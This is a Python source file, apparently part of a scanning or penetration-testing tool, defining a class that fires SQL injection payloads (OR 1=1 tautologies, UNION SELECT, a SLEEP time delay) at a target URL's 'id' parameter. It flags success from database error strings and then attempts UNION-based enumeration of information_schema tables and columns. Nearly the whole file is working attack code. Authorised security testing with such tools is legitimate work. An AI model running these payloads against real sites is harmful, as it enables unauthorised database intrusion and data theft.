import requests

class SQLInjectionManager:
    def __init__(self):
        pass  # You'll later add things like logging or Neo4j

    def perform_sql_injection(self, target_url, port, timeout=5, headers=None, enum_level=0):
        print(f"[SQLInjection] Starting test on {target_url}:{port}")
        if headers is None:
            headers = {}

        payloads = [
            "' OR '1'='1",
            "' OR 1=1 --",
            "' UNION SELECT NULL --",
            "' AND SLEEP(5)--"
        ]

        results = []

        for payload in payloads:
            full_url = f"{target_url}:{port}/?id={payload}"
            try:
                response = requests.get(full_url, headers=headers, timeout=timeout)
                result = {
                    "payload": payload,
                    "status_code": response.status_code,
                    "content_length": len(response.text),
                    "snippet": response.text[:150]
                }
                print(f"[SQLInjection] Payload '{payload}' gave status {response.status_code}")
                results.append(result)

                if self._is_vulnerable(response):
                    result["vulnerable"] = True
                    break  # Stop after the first success
                else:
                    result["vulnerable"] = False

            except Exception as e:
                print(f"[SQLInjection] Error on payload '{payload}': {e}")
                results.append({
                    "payload": payload,
                    "error": str(e),
                    "vulnerable": False
                })

        output = {
            "target": target_url,
            "results": results,
            "vulnerable": any(r.get("vulnerable") for r in results)
        }

        if output["vulnerable"] and enum_level > 0:
            output["tables"] = self._enumerate_db(target_url, port, timeout, headers)

        return output

    def _is_vulnerable(self, response):
        if response is None:
            return False
        indicators = [
            "sql syntax", "mysql", "syntax error", "unexpected token",
            "you are logged in", "ORA-", "SQLite", "unterminated"
        ]
        return any(indicator.lower() in response.text.lower() for indicator in indicators)
    
    
    def _enumerate_db(self, target_url, port, timeout, headers):
        print("[SQLInjection] Attempting table enumeration...")

        enum_payloads = [
            "' UNION SELECT table_name FROM information_schema.tables --",
            "' UNION SELECT column_name FROM information_schema.columns --"
        ]

        found_tables = []

        for payload in enum_payloads:
            full_url = f"{target_url}:{port}/?id={payload}"
            try:
                response = requests.get(full_url, headers=headers, timeout=timeout)
                if response.status_code == 200:
                    snippet = response.text[:200].lower()
                    if "users" in snippet or "admin" in snippet:
                        found_tables.append("users/admin (guessed)")
                    elif "products" in snippet:
                        found_tables.append("products (guessed)")
                    else:
                        found_tables.append("unknown_table")
            except Exception as e:
                print(f"[SQLInjection] Enum payload error: {e}")
                continue

        return found_tables